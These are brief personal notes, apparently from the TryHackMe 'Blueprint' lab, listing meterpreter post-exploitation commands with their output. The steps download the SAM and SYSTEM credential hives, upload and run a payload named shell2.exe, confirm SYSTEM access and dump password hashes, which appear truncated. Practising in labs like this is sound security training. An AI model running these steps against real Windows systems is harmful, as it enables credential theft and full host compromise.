# meterpreter

## **查看其他 Registry 檔案**:
```bash
# SAM, SYSTEM, SECURITY
meterpreter > download C:\Windows\System32\config\SAM
meterpreter > download C:\Windows\System32\config\SYSTEM
```

## shell
```bash
meterpreter > shell
C:\> where mctadmin.exe
```

## 下載檔案
```bash
meterpreter > upload shell2.exe
[*] Uploading  : /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe

```
## 執行檔案
```bash
meterpreter > execute -f shell2.exe
Process 9704 created.
```

## getuid
```bash
meterpreter > getuid
Server username: SYSTEM
```

## hashdump
```bash
meterpreter > hashdump
Administrator:500:aa...ee:54...11:::
Guest:501:aa...ee:31...c0:::
Lab:1000:aa...ee:30...50:::
```